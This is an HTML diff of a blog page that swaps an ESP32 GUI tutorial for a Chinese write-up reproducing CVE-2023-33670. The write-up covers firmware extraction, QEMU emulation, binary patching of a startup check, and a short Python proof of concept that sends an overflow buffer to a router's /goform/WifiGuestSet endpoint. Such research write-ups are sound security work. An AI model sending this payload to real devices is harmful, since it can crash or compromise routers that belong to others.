@@ -20,22 +20,22 @@
 		<link rel="modulepreload" href="../_app/immutable/chunks/posts.7eeb28a4.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/posts.66901c9e.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/icon.91a6a625.js">
-		<link rel="modulepreload" href="../_app/immutable/nodes/7.b2e581ef.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/8.df19e003.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/post_layout.b4692dd9.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/post_card.e679ecb5.js">
-		<link rel="modulepreload" href="../_app/immutable/chunks/footer.5e75ecdd.js"><title>LVGL 初探 | Az's Blog</title><!-- HEAD_svelte-1592q3p_START --><!-- HEAD_svelte-1592q3p_END --><!-- HEAD_svelte-1kxdj3d_START --><link rel="shortcut icon" href="https://az0x01-blog.vercel.app/favicon.png" sizes="48x48" type="image/png"><link rel="apple-touch-icon" href="https://az0x01-blog.vercel.app/assets/any@180.png" sizes="180x180" type="image/png"><link rel="icon" href="https://az0x01-blog.vercel.app/assets/any@192.png" sizes="192x192" type="image/png"><!-- HEAD_svelte-1kxdj3d_END --><!-- HEAD_svelte-1g590ms_START --><meta name="theme-color"><!-- HEAD_svelte-1g590ms_END --><!-- HEAD_svelte-abrfj_START --><meta name="author" content="Az"><link rel="canonical" href="https://az0x01-blog.vercel.app/20230805">
+		<link rel="modulepreload" href="../_app/immutable/chunks/footer.5e75ecdd.js"><title>CVE-2023-33670 复现 | Az's Blog</title><!-- HEAD_svelte-1592q3p_START --><!-- HEAD_svelte-1592q3p_END --><!-- HEAD_svelte-1kxdj3d_START --><link rel="shortcut icon" href="https://az0x01-blog.vercel.app/favicon.png" sizes="48x48" type="image/png"><link rel="apple-touch-icon" href="https://az0x01-blog.vercel.app/assets/any@180.png" sizes="180x180" type="image/png"><link rel="icon" href="https://az0x01-blog.vercel.app/assets/any@192.png" sizes="192x192" type="image/png"><!-- HEAD_svelte-1kxdj3d_END --><!-- HEAD_svelte-1g590ms_START --><meta name="theme-color"><!-- HEAD_svelte-1g590ms_END --><!-- HEAD_svelte-abrfj_START --><meta name="author" content="Az"><link rel="canonical" href="https://az0x01-blog.vercel.app/20230823">
     
-    <meta name="keywords" content="IoT">
-    <meta name="description" content="使用 SquareLine Stdio 的 GUI 开发"><!-- HEAD_svelte-abrfj_END --><!-- HEAD_svelte-4dky5b_START --><meta property="og:site_name" content="Az's Blog"><meta property="og:locale" content="en-US"><meta property="og:type" content="article">
-    <meta property="og:title" content="LVGL 初探">
-    <meta property="og:description" content="使用 SquareLine Stdio 的 GUI 开发">
-    <meta property="og:image" content="https://az0x01-blog.vercel.app/assets/maskable@512.png">
-      <meta name="twitter:card" content="summary">
-    <meta property="article:tag" content="IoT">
-    <meta property="og:url" content="https://az0x01-blog.vercel.app/20230805">
+    <meta name="keywords" content="PWN">
+    <meta name="description" content="以及自己的第一个 CVE 编号"><!-- HEAD_svelte-abrfj_END --><!-- HEAD_svelte-4dky5b_START --><meta property="og:site_name" content="Az's Blog"><meta property="og:locale" content="en-US"><meta property="og:type" content="article">
+    <meta property="og:title" content="CVE-2023-33670 复现">
+    <meta property="og:description" content="以及自己的第一个 CVE 编号">
+    <meta property="og:image" content="https://az0x01-blog.vercel.app/20230823/penup.webp">
+      <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:tag" content="PWN">
+    <meta property="og:url" content="https://az0x01-blog.vercel.app/20230823">
     <meta property="article:author" content="Az">
-    <meta property="article:published_time" content="2023-08-05T00:00:00.000Z">
-    <meta property="article:modified_time" content="2023-08-05T00:00:00.000Z"><!-- HEAD_svelte-4dky5b_END -->
+    <meta property="article:published_time" content="2023-08-23T00:00:00.000Z">
+    <meta property="article:modified_time" content="2023-09-19T00:00:00.000Z"><!-- HEAD_svelte-4dky5b_END -->
   </head>
   <body itemscope itemtype="https://schema.org/WebPage">
     <div style="display: contents">
@@ -104,39 +104,54 @@
   <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0"><article itemscope itemtype="https://schema.org/BlogPosting" itemprop="blogPost" class="h-entry card bg-base-100 rounded-none md:rounded-box md:shadow-xl overflow-hidden z-10 md:mb-8 lg:mb-16">
   
   
-  <div class="card-body gap-0 "><div class="flex flex-col gap-2">
+  <div class="card-body gap-0 "><div class="flex flex-col gap-2"><figure class="md:order-last rounded-box shadow-xl mb-4 flex-col gap-2 -mx-4 -mt-8 md:mt-0"><picture><source srcset="/_app/immutable/assets/penup.3a562f0f.avif 736w" type="image/avif">
+    <img src="/20230823/penup.webp" alt="/20230823/penup.webp" class="u-featured" loading="lazy" decoding="async"></picture></figure>
       <div class="flex font-semibold gap-1.5"><a rel="author" class="opacity-75 hover:opacity-100 hover:text-primary duration-500 ease-in-out p-author h-card" href="https://az0x01-blog.vercel.app">Az</a>
   <span class="opacity-50">/</span>
-  <a href="/20230805" class="u-url u-uid swap group/time"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2023-08-05T00:00:00.000Z" itemprop="datePublished">Saturday, Aug 5, 23</time>
-    <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2023-08-05T00:00:00.000Z" itemprop="dateModified">Saturday, Aug 5, 23</time></a></div>
-      <h1 itemprop="name headline" class="card-title text-3xl mb-8 p-name">LVGL 初探</h1>
-      <p itemprop="description" class="p-summary mb-auto hidden">使用 SquareLine Stdio 的 GUI 开发</p></div>
-    <main itemprop="articleBody" class="urara-prose prose e-content"><h2 id="环境需求"><a href="#环境需求">环境需求</a></h2>
-<ul><li>ESP32-S3-LCD-EV-BOARD</li>
-<li><a href="https://squareline.io/" rel="nofollow noopener noreferrer external" target="_blank">SquareLine Stdio</a> v1.3.1</li>
-<li>ESP-IDF v5.0.2</li></ul>
-<h2 id="创建项目"><a href="#创建项目">创建项目</a></h2>
-<ol><li>在 SquareLine Stdio 的欢迎菜单中选择 Example，选择任意一个示例项目，点击 creat，待相关文件加载完毕</li>
-<li>打开 flie 选项卡的 Project setting 修改 BOARD GROUP 为 Espressif，选择 开发板型号并保存</li>
-<li>在 Font Manager 选项卡的 CREATFONT 下进行 modify 以防报错</li>
-<li>在 Inspector 选项卡的 STYLE(MAIN) 下 确定项目的 Text Font，以便稍后修改</li>
-<li>在 Export 选项卡中导出项目，先 Creat Template project 然后再 Export UI Files</li></ol>
-<h2 id="修改-menuconfig"><a href="#修改-menuconfig">修改 Menuconfig</a></h2>
-<h3 id="修改字体"><a href="#修改字体">修改字体</a></h3>
-<p>在 ESP-IDF 中打开项目 使用 <code>idf.py menuconfig</code> 命令<br>
-搜索 <code>font 26</code> 选择 LV_FONTMONTSERRAT_26(=n) “Enable Montserrat 26” 启用后保存</p>
-<h3 id="设置-psram-为-120mhz"><a href="#设置-psram-为-120mhz">设置 psram 为 120MHz</a></h3>
-<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">1.</span><span style="color: #EEFFFF"> 搜索 psram</span></div><div class='line'><span style="color: #89DDFF">2.</span><span style="color: #EEFFFF"> 选择 SPIRAM_MODE_OCT(=y) "Octal Mode PSRAM"</span></div><div class='line'><span style="color: #89DDFF">3.</span><span style="color: #EEFFFF"> 进入 Octal Mode PSRAM</span></div><div class='line'><span style="color: #89DDFF">4.</span><span style="color: #EEFFFF"> 进入 Set RAM clock speed</span></div><div class='line'><span style="color: #89DDFF">5.</span><span style="color: #EEFFFF"> 选择 120MHz clock speed</span></div></code></div></pre><!-- HTML_TAG_END -->
-<h3 id="设置-flash-为-120mhz"><a href="#设置-flash-为-120mhz">设置 flash 为 120MHz</a></h3>
-<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">1.</span><span style="color: #EEFFFF"> 搜索 flash</span></div><div class='line'><span style="color: #89DDFF">2.</span><span style="color: #EEFFFF"> 选择 ESPTOOLPY_FLASHFREQ_120M(=n) "120MHz"</span></div><div class='line'><span style="color: #89DDFF">3.</span><span style="color: #EEFFFF"> 选择 120MHz</span></div></code></div></pre><!-- HTML_TAG_END -->
-<h3 id="设置-data-cache-line"><a href="#设置-data-cache-line">设置 data cache line</a></h3>
-<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">1.</span><span style="color: #EEFFFF"> 搜索 data cache line</span></div><div class='line'><span style="color: #89DDFF">2.</span><span style="color: #EEFFFF"> 选择 ESP_32S3_DATA_CACHE_LINE_64B(=n) "64 Bytes"</span></div><div class='line'><span style="color: #89DDFF">3.</span><span style="color: #EEFFFF"> 选择 64Bytes</span></div></code></div></pre><!-- HTML_TAG_END -->
-<h3 id="开启防撕裂模式"><a href="#开启防撕裂模式">开启防撕裂模式</a></h3>
-<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">1.</span><span style="color: #EEFFFF"> 搜索 avoid tearing effect</span></div><div class='line'><span style="color: #89DDFF">2.</span><span style="color: #EEFFFF"> 进入 BSP_DISPLAY_LVGL_AVOID_TEAR(=n) "Avoid tearing effect"</span></div><div class='line'><span style="color: #89DDFF">3.</span><span style="color: #EEFFFF"> 选择 Avoid tearing effect (NEW),进入 LCD</span></div><div class='line'><span style="color: #89DDFF">4.</span><span style="color: #EEFFFF"> 开启 Enable to use double frame buffers 以及 Enable to refresh LCD manually</span></div><div class='line'><span style="color: #89DDFF">5.</span><span style="color: #EEFFFF"> 进入 Display， 开启 Avoid tearing effect</span></div><div class='line'><span style="color: #89DDFF">6.</span><span style="color: #EEFFFF"> 进入 Select LVGL buffer mode，开启 Direct mode</span></div></code></div></pre><!-- HTML_TAG_END -->
-<h2 id="编译烧录"><a href="#编译烧录">编译烧录</a></h2>
-<p>在 ESP-IDF 中使用 <code>idf.py build</code> 编译后进行烧录</p></main>
+  <a href="/20230823" class="u-url u-uid swap group/time"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2023-08-23T00:00:00.000Z" itemprop="datePublished">Wednesday, Aug 23, 23</time>
+    <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2023-09-19T00:00:00.000Z" itemprop="dateModified">Tuesday, Sep 19, 23</time></a></div>
+      <h1 itemprop="name headline" class="card-title text-3xl mb-8 p-name">CVE-2023-33670 复现</h1>
+      <p itemprop="description" class="p-summary mb-auto hidden">以及自己的第一个 CVE 编号</p></div>
+    <main itemprop="articleBody" class="urara-prose prose e-content"><h2 id="bin-文件的处理"><a href="#bin-文件的处理">bin 文件的处理</a></h2>
+<p>使用 binwalk 对 bin 文件进行处理</p>
+<p>安装 : <code>apt install binwalk</code></p>
+<p>命令 : <code>binwalk -Me ./*.bin</code></p>
+<p>解包后即为标准的 unix 文件系统</p>
+<h2 id="qemu-环境搭建"><a href="#qemu-环境搭建">qemu 环境搭建</a></h2>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">  apt-get install qemu-system</span></div><div class='line'><span style="color: undefined">  apt-get install qemu-user-static</span></div></code></div></pre><!-- HTML_TAG_END -->
+<p>以 <code>./bin/httpd</code> 为目标，使用<code>file</code>查看信息，LSB 选择 mipsel</p>
+<p>进入到解包后的<strong>*bin/extracted/squashfs-root/</strong>目录下</p>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">  cp $(which qemu-mipsel-static) ./</span></div><div class='line'><span style="color: undefined">  sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</span></div></code></div></pre><!-- HTML_TAG_END -->
+<p>启动<strong>目标 httpd</strong>，由于存在检查，失败</p>
+<h2 id="修补程序去掉-check"><a href="#修补程序去掉-check">修补程序，去掉 check</a></h2>
+<p>Patch 前：</p>
+<p><img src="./image-20230823195926271.png" alt="image-20230823195926271" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
+<p>使用 IDAPro 进行 Patch</p>
+<p><img src="./image-20230823200528802.png" alt="image-20230823200528802" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
+<p>通过搜索<strong>Welcome</strong>关键字，找到程序中断点，</p>
+<p>切换到图模式，可以确认在 <code>bgez</code> 处进行判断，只需要将原来的 <code>&gt;=</code> 修改即可，也就是将 <code>bgez</code> 改为 <code>bltz</code></p>
+<p>在 <code>Edit -&gt; Patch program -&gt; Change byte</code>中 将<code>0A 00 41 04</code>改为<code>0A 00 01 04</code> 即可</p>
+<p>Patch 后：</p>
+<p><img src="./image-20230823195553164.png" alt="image-20230823195553164" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
+<h2 id="创建-bridge"><a href="#创建-bridge">创建 <code>bridge</code></a></h2>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">sudo brctl addbr br0</span></div><div class='line'><span style="color: undefined">sudo brctl addif br0 eth0 &lt;- [eth0 from your interface on ifconfig]</span></div><div class='line'><span style="color: undefined">sudo ifconfig br0 up</span></div><div class='line'><span style="color: undefined">sudo dhclient br0</span></div></code></div></pre><!-- HTML_TAG_END -->
+<p>如出现<code>Unsupported setsockopt level=65535 optname=128</code></p>
+<p>执行 <code>cp -rf ./webroot_ro/* ./var/webroot/</code> 即可正常运行</p>
+<h2 id="使用-poc-攻击"><a href="#使用-poc-攻击">使用 Poc 攻击</a></h2>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">host </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">192.168.59.136:80</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">cyclic </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaa</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">exploit_WifiGuestSet</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"http://</span><span style="color: #EEFFFF">&#123;host&#125;</span><span style="color: #C3E88D">/goform/WifiGuestSet"</span></div><div class='line'><span style="color: #EEFFFF">    data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">shareSpeed</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF">cyclic</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    res </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">url</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">res</span><span style="color: #89DDFF">.</span><span style="color: #F07178">content</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">exploit_WifiGuestSet</span><span style="color: #89DDFF">()</span></div></code></div></pre><!-- HTML_TAG_END -->
+<h2 id="mips-编译测试"><a href="#mips-编译测试">MIPS 编译测试</a></h2>
+<p>安装编译器</p>
+<p><code>sudo apt-get install gcc-mips-linux-gnu</code></p>
+<p>使用下面代码测试</p>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">#include &lt;stdio.h&gt;</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">int main(void) &#123;</span></div><div class='line'><span style="color: undefined">    printf("hello&#92;n");</span></div><div class='line'><span style="color: undefined">    return 0;</span></div><div class='line'><span style="color: undefined">&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
+<p>编译</p>
+<p><code>mips-linux-gnu-gcc -static hello.c -o hello</code></p>
+<p>运行结果</p>
+<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">$ cp /usr/bin/qemu-mips-static .</span></div><div class='line'><span style="color: undefined">$ qemu-mips-static ./hello</span></div><div class='line'><span style="color: undefined">hello</span></div></code></div></pre><!-- HTML_TAG_END -->
+<h2 id="照猫画虎"><a href="#照猫画虎">照猫画虎</a></h2>
+<blockquote><p>拿到了第一个 CVE 编号 <code>CVE-2023-42320</code></p></blockquote></main>
     <div class="divider mt-4 mb-0"></div>
-      <div><a href="/?tags=IoT" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#IoT
+      <div><a href="/?tags=PWN" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#PWN
           </a></div></div>
   
     </article>
@@ -171,7 +186,7 @@
 						import("../_app/immutable/entry/app.c353dba5.js")
 					]).then(([kit, app]) => {
 						kit.start(app, element, {
-							node_ids: [0, 7],
+							node_ids: [0, 8],
 							data,
 							form: null,
 							error: null
